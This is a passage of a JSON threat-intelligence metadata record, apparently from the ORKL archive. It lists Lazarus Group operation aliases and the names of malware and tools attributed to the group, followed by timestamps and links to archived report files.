                "Operation Marstech Mayhem",
                "Operation No Pineapple!",
                "Operation North Star",
                "Operation Phantom Circuit",
                "Operation Sharpshooter",
                "Operation Ten Days of Rain / DarkSeoul",
                "Operation Troy",
                "SectorA01",
                "Slow Pisces",
                "TA404",
                "TraderTraitor",
                "UNC2970",
                "UNC4034",
                "UNC4736",
                "UNC4899",
                "UNC577",
                "Whois Hacking Team"
            ],
            "source_name": "ETDA:Lazarus Group",
            "tools": [
                "3CX Backdoor",
                "3Rat Client",
                "3proxy",
                "AIRDRY",
                "ARTFULPIE",
                "ATMDtrack",
                "AlphaNC",
                "Alreay",
                "Andaratm",
                "AngryRebel",
                "AppleJeus",
                "Aryan",
                "AuditCred",
                "BADCALL",
                "BISTROMATH",
                "BLINDINGCAN",
                "BTC Changer",
                "BUFFETLINE",
                "BanSwift",
                "Bankshot",
                "Bitrep",
                "Bitsran",
                "BlindToad",
                "Bookcode",
                "BootWreck",
                "BottomLoader",
                "Brambul",
                "BravoNC",
                "Breut",
                "COLDCAT",
                "COPPERHEDGE",
                "CROWDEDFLOUNDER",
                "Castov",
                "CheeseTray",
                "CleanToad",
                "ClientTraficForwarder",
                "CollectionRAT",
                "Concealment Troy",
                "Contopee",
                "CookieTime",
                "Cyruslish",
                "DAVESHELL",
                "DBLL Dropper",
                "DLRAT",
                "DRATzarus",
                "DRATzarus RAT",
                "Dacls",
                "Dacls RAT",
                "DarkComet",
                "DarkKomet",
                "DeltaCharlie",
                "DeltaNC",
                "Dembr",
                "Destover",
                "DoublePulsar",
                "Dozer",
                "Dtrack",
                "Duuzer",
                "DyePack",
                "ECCENTRICBANDWAGON",
                "ELECTRICFISH",
                "Escad",
                "EternalBlue",
                "FALLCHILL",
                "FYNLOS",
                "FallChill RAT",
                "Farfli",
                "Fimlis",
                "FoggyBrass",
                "FudModule",
                "Fynloski",
                "Gh0st RAT",
                "Ghost RAT",
                "Gopuram",
                "HARDRAIN",
                "HIDDEN COBRA RAT/Worm",
                "HLOADER",
                "HOOKSHOT",
                "HOPLIGHT",
                "HOTCROISSANT",
                "HOTWAX",
                "HTTP Troy",
                "Hawup",
                "Hawup RAT",
                "Hermes",
                "HotCroissant",
                "HotelAlfa",
                "Hotwax",
                "HtDnDownLoader",
                "Http Dr0pper",
                "ICONICSTEALER",
                "Joanap",
                "Jokra",
                "KANDYKORN",
                "KEYMARBLE",
                "Kaos",
                "KillDisk",
                "KillMBR",
                "Koredos",
                "Krademok",
                "LIGHTSHIFT",
                "LIGHTSHOW",
                "LOLBAS",
                "LOLBins",
                "Lazarus",
                "LightlessCan",
                "Living off the Land",
                "MATA",
                "MBRkiller",
                "MagicRAT",
                "Manuscrypt",
                "Mimail",
                "Mimikatz",
                "Moudour",
                "Mydoom",
                "Mydoor",
                "Mytob",
                "NACHOCHEESE",
                "NachoCheese",
                "NestEgg",
                "NickelLoader",
                "NineRAT",
                "Novarg",
                "NukeSped",
                "OpBlockBuster",
                "PCRat",
                "PEBBLEDASH",
                "PLANKWALK",
                "POOLRAT",
                "PSLogger",
                "PhanDoor",
                "Plink",
                "PondRAT",
                "PowerBrace",
                "PowerRatankba",
                "PowerShell RAT",
                "PowerSpritz",
                "PowerTask",
                "Preft",
                "ProcDump",
                "Proxysvc",
                "PuTTY Link",
                "QUICKRIDE",
                "QUICKRIDE.POWER",
                "Quickcafe",
                "QuiteRAT",
                "R-C1",
                "ROptimizer",
                "Ratabanka",
                "RatabankaPOS",
                "Ratankba",
                "RatankbaPOS",
                "RawDisk",
                "RedShawl",
                "Rifdoor",
                "Rising Sun",
                "Romeo-CoreOne",
                "RomeoAlfa",
                "RomeoBravo",
                "RomeoCharlie",
                "RomeoCore",
                "RomeoDelta",
                "RomeoEcho",
                "RomeoFoxtrot",
                "RomeoGolf",
                "RomeoHotel",
                "RomeoMike",
                "RomeoNovember",
                "RomeoWhiskey",
                "Romeos",
                "RustBucket",
                "SHADYCAT",
                "SHARPKNOT",
                "SIGFLIP",
                "SIMPLESEA",
                "SLICKSHOES",
                "SORRYBRUTE",
                "SUDDENICON",
                "SUGARLOADER",
                "SheepRAT",
                "SierraAlfa",
                "SierraBravo",
                "SierraCharlie",
                "SierraJuliett-MikeOne",
                "SierraJuliett-MikeTwo",
                "SimpleTea",
                "SimplexTea",
                "SmallTiger",
                "Stunnel",
                "TAINTEDSCRIBE",
                "TAXHAUL",
                "TFlower",
                "TOUCHKEY",
                "TOUCHMOVE",
                "TOUCHSHIFT",
                "TOUCHSHOT",
                "TWOPENCE",
                "TYPEFRAME",
                "Tdrop",
                "Tdrop2",
                "ThreatNeedle",
                "Tiger RAT",
                "TigerRAT",
                "Trojan Manuscript",
                "Troy",
                "TroyRAT",
                "VEILEDSIGNAL",
                "VHD",
                "VHD Ransomware",
                "VIVACIOUSGIFT",
                "VSingle",
                "ValeforBeta",
                "Volgmer",
                "Vyveva",
                "W1_RAT",
                "Wana Decrypt0r",
                "WanaCry",
                "WanaCrypt",
                "WanaCrypt0r",
                "WannaCry",
                "WannaCrypt",
                "WannaCryptor",
                "WbBot",
                "Wcry",
                "Win32/KillDisk.NBB",
                "Win32/KillDisk.NBC",
                "Win32/KillDisk.NBD",
                "Win32/KillDisk.NBH",
                "Win32/KillDisk.NBI",
                "WinorDLL64",
                "Winsec",
                "WolfRAT",
                "Wormhole",
                "YamaBot",
                "Yort",
                "ZetaNile",
                "concealment_troy",
                "http_troy",
                "httpdr0pper",
                "httpdropper",
                "klovbot",
                "sRDI"
            ],
            "source_id": "ETDA",
            "reports": null
        }
    ],
    "ts_created_at": 1673536105,
    "ts_updated_at": 1743041843,
    "ts_creation_date": 1653757478,
    "ts_modification_date": 1653757478,
    "files": {
        "pdf": "https://archive.orkl.eu/2fe21502e92e11d31e26b34422f2b543d652e30e.pdf",
        "text": "https://archive.orkl.eu/2fe21502e92e11d31e26b34422f2b543d652e30e.txt",
        "img": "https://archive.orkl.eu/2fe21502e92e11d31e26b34422f2b543d652e30e.jpg"
    }
}